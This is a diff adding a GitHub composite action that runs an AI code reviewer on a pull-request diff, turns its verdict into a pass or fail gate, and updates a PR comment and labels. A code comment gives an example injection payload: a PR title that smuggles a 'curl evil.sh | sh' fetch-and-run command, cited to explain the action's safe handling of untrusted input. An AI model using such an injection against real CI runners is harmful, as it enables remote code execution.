@@ -1,0 +1,263 @@
+name: "AI code review"
+description: "Runs the packaged AI reviewer over a unified diff and reports the verdict back to a pull request."
+
+inputs:
+  diff-path:
+    description: "Path to a file containing the unified diff to review. Absolute, or relative to the workspace."
+    required: true
+  api-key:
+    description: "OpenRouter API key. Pass a secret — never a literal."
+    required: true
+  reviewer-dir:
+    description: "Directory of the reviewer package (must contain package.json + package-lock.json)."
+    required: false
+    default: "packages/code-reviewer"
+  model:
+    description: "OpenRouter model id. Empty uses the reviewer's own default."
+    required: false
+    default: ""
+  pr-number:
+    description: "Pull request number. When empty, the action reviews and reports to the log only — no comment, no labels."
+    required: false
+    default: ""
+  pr-title:
+    description: "Pull request title, handed to the model as context."
+    required: false
+    default: ""
+  pr-body:
+    description: "Pull request description, handed to the model as context."
+    required: false
+    default: ""
+  github-token:
+    description: "Token used for the PR comment and labels. Required when pr-number is set."
+    required: false
+    default: ""
+  fail-on:
+    description: "Comma-separated model verdicts that map to a 'fail' output."
+    required: false
+    default: "request-changes"
+  max-diff-bytes:
+    description: "Diffs larger than this are truncated before they reach the model, capping token spend."
+    required: false
+    default: "200000"
+  comment-marker:
+    description: "Hidden HTML marker identifying this action's comment, so reruns update instead of duplicate."
+    required: false
+    default: "<!-- ai-cr:review -->"
+
+outputs:
+  verdict:
+    description: "'pass' or 'fail' — the gate signal."
+    value: ${{ steps.evaluate.outputs.verdict }}
+  raw-verdict:
+    description: "The model's own verdict: approve | comment | request-changes."
+    value: ${{ steps.evaluate.outputs.raw-verdict }}
+  findings-count:
+    description: "Number of findings in the report."
+    value: ${{ steps.evaluate.outputs.findings-count }}
+  report-path:
+    description: "Path to the raw JSON report."
+    value: ${{ steps.review.outputs.report-path }}
+
+runs:
+  using: composite
+  steps:
+    - name: Install reviewer dependencies
+      shell: bash
+      working-directory: ${{ inputs.reviewer-dir }}
+      run: npm ci --no-audit --no-fund
+
+    - name: Run reviewer
+      id: review
+      shell: bash
+      env:
+        # Everything below is untrusted or secret, so it crosses into the script as an
+        # environment variable. Never interpolate ${{ }} into a run block: a PR title of
+        # `"; curl evil.sh | sh; #` would otherwise execute on the runner.
+        DIFF_PATH: ${{ inputs.diff-path }}
+        REVIEWER_DIR: ${{ inputs.reviewer-dir }}
+        PR_TITLE: ${{ inputs.pr-title }}
+        PR_BODY: ${{ inputs.pr-body }}
+        MAX_DIFF_BYTES: ${{ inputs.max-diff-bytes }}
+        OPENROUTER_API_KEY: ${{ inputs.api-key }}
+        OPENROUTER_MODEL: ${{ inputs.model }}
+      run: |
+        set -euo pipefail
+
+        case "$DIFF_PATH" in
+          /*) diff_abs="$DIFF_PATH" ;;
+          *)  diff_abs="$GITHUB_WORKSPACE/$DIFF_PATH" ;;
+        esac
+        [ -s "$diff_abs" ] || { echo "::error::Diff file '$diff_abs' is missing or empty."; exit 1; }
+
+        # The reviewer's own default model wins when no override was given.
+        [ -n "$OPENROUTER_MODEL" ] || unset OPENROUTER_MODEL
+
+        payload="$RUNNER_TEMP/ai-review-diff.patch"
+        if [ "$(wc -c < "$diff_abs")" -gt "$MAX_DIFF_BYTES" ]; then
+          echo "::warning::Diff exceeds ${MAX_DIFF_BYTES} bytes; truncating before review."
+          head -c "$MAX_DIFF_BYTES" "$diff_abs" > "$payload"
+          printf '\n\n[diff truncated at %s bytes]\n' "$MAX_DIFF_BYTES" >> "$payload"
+        else
+          cp "$diff_abs" "$payload"
+        fi
+
+        # PR title/body reach the model through `context`, written to a file so no
+        # amount of quoting or newlines in them can break the command line.
+        context="$RUNNER_TEMP/ai-review-context.txt"
+        {
+          printf 'Repository: %s\n' "$GITHUB_REPOSITORY"
+          [ -n "$PR_TITLE" ] && printf 'Pull request title: %s\n' "$PR_TITLE"
+          if [ -n "$PR_BODY" ]; then
+            printf '\nPull request description:\n%s\n' "$PR_BODY"
+          fi
+          printf '\nYou are reviewing a unified diff, not whole files. Judge only the changed lines.\n'
+        } > "$context"
+
+        report="$RUNNER_TEMP/ai-review-report.json"
+        echo "report-path=$report" >> "$GITHUB_OUTPUT"
+
+        # tsx resolves from the package's own node_modules — never from the network.
+        cd "$GITHUB_WORKSPACE/$REVIEWER_DIR"
+        ./node_modules/.bin/tsx src/index.ts --json --context-file "$context" \
+          < "$payload" > "$report"
+
+    - name: Evaluate verdict
+      id: evaluate
+      shell: bash
+      env:
+        FAIL_ON: ${{ inputs.fail-on }}
+        REPORT: ${{ steps.review.outputs.report-path }}
+      run: |
+        set -euo pipefail
+
+        jq -e 'has("verdict") and has("findings")' "$REPORT" > /dev/null \
+          || { echo "::error::Reviewer produced a malformed report."; cat "$REPORT"; exit 1; }
+
+        raw=$(jq -r '.verdict' "$REPORT")
+        count=$(jq -r '.findings | length' "$REPORT")
+
+        if printf ',%s,' "$FAIL_ON" | tr -d '[:space:]' | grep -qF ",$raw,"; then
+          verdict=fail
+        else
+          verdict=pass
+        fi
+
+        {
+          echo "raw-verdict=$raw"
+          echo "findings-count=$count"
+          echo "verdict=$verdict"
+        } >> "$GITHUB_OUTPUT"
+
+        echo "Model verdict '$raw' with $count finding(s) maps to: $verdict"
+
+    - name: Render report
+      id: render
+      shell: bash
+      env:
+        REPORT: ${{ steps.review.outputs.report-path }}
+        MARKER: ${{ inputs.comment-marker }}
+        MODEL: ${{ inputs.model }}
+        RAW: ${{ steps.evaluate.outputs.raw-verdict }}
+      run: |
+        set -euo pipefail
+
+        case "$RAW" in
+          approve)         header="✅ AI code review — approved" ;;
+          comment)         header="💬 AI code review — comments" ;;
+          request-changes) header="❌ AI code review — changes requested" ;;
+          *)               header="🤖 AI code review — $RAW" ;;
+        esac
+
+        body="$RUNNER_TEMP/ai-review-comment.md"
+        echo "body-path=$body" >> "$GITHUB_OUTPUT"
+
+        jq -rf "$GITHUB_ACTION_PATH/render-comment.jq" \
+          --arg marker "$MARKER" \
+          --arg header "$header" \
+          --arg model "${MODEL:-default}" \
+          --arg run_url "$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID" \
+          "$REPORT" > "$body"
+
+        # Always visible, including on workflow_dispatch runs that have no PR to comment on.
+        cat "$body" >> "$GITHUB_STEP_SUMMARY"
+
+    - name: Upsert pull request comment
+      if: inputs.pr-number != ''
+      shell: bash
+      env:
+        GH_TOKEN: ${{ inputs.github-token }}
+        PR_NUMBER: ${{ inputs.pr-number }}
+        MARKER: ${{ inputs.comment-marker }}
+        BODY: ${{ steps.render.outputs.body-path }}
+      run: |
+        set -euo pipefail
+
+        # Match on the marker rather than the author so the comment is still found
+        # when the workflow runs under a different token/app than it did last time.
+        # Captured before filtering: piping `gh --paginate` straight into `head` lets
+        # SIGPIPE kill gh, which under `set -o pipefail` would fail the whole step.
+        matches=$(gh api --paginate "repos/$GITHUB_REPOSITORY/issues/$PR_NUMBER/comments" \
+          --jq ".[] | select(.body | startswith(\"$MARKER\")) | .id")
+        existing=$(printf '%s\n' "$matches" | head -n1)
+
+        if [ -n "$existing" ]; then
+          gh api --method PATCH "repos/$GITHUB_REPOSITORY/issues/comments/$existing" \
+            -F "body=@$BODY" --silent
+          echo "Updated comment $existing."
+        else
+          gh api --method POST "repos/$GITHUB_REPOSITORY/issues/$PR_NUMBER/comments" \
+            -F "body=@$BODY" --silent
+          echo "Posted a new comment."
+        fi
+
+    - name: Apply verdict labels
+      if: inputs.pr-number != ''
+      shell: bash
+      env:
+        GH_TOKEN: ${{ inputs.github-token }}
+        PR_NUMBER: ${{ inputs.pr-number }}
+        VERDICT: ${{ steps.evaluate.outputs.verdict }}
+      run: |
+        set -euo pipefail
+
+        if [ "$VERDICT" = "fail" ]; then
+          add="ai-cr:failed";  drop="ai-cr:passed"
+        else
+          add="ai-cr:passed";  drop="ai-cr:failed"
+        fi
+
+        current=$(gh api --paginate "repos/$GITHUB_REPOSITORY/issues/$PR_NUMBER/labels" --jq '.[].name')
+
+        # Drop first: the two are mutually exclusive, and removing before adding means
+        # a failed add never leaves both on the PR at once.
+        if printf '%s\n' "$current" | grep -qxF "$drop"; then
+          encoded=$(printf '%s' "$drop" | jq -sRr @uri)
+          gh api --method DELETE "repos/$GITHUB_REPOSITORY/issues/$PR_NUMBER/labels/$encoded" --silent \
+            || echo "::warning::Could not remove label '$drop'."
+        fi
+
+        if printf '%s\n' "$current" | grep -qxF "$add"; then
+          echo "Label '$add' already present."
+        else
+          gh api --method POST "repos/$GITHUB_REPOSITORY/issues/$PR_NUMBER/labels" -f "labels[]=$add" --silent \
+            || echo "::warning::Could not add label '$add' — create it in the repository first."
+        fi
+
+    - name: Clear the retrigger label
+      # always(): if the review itself blew up, the label must still come off, or the
+      # PR is stuck — re-adding a label that is already present fires no event.
+      if: always() && inputs.pr-number != ''
+      shell: bash
+      env:
+        GH_TOKEN: ${{ inputs.github-token }}
+        PR_NUMBER: ${{ inputs.pr-number }}
+      run: |
+        set -euo pipefail
+
+        current=$(gh api --paginate "repos/$GITHUB_REPOSITORY/issues/$PR_NUMBER/labels" --jq '.[].name')
+        if printf '%s\n' "$current" | grep -qxF 'ai-cr:review'; then
+          gh api --method DELETE \
+            "repos/$GITHUB_REPOSITORY/issues/$PR_NUMBER/labels/ai-cr%3Areview" --silent \
+            || echo "::warning::Could not remove the 'ai-cr:review' label."
+        fi
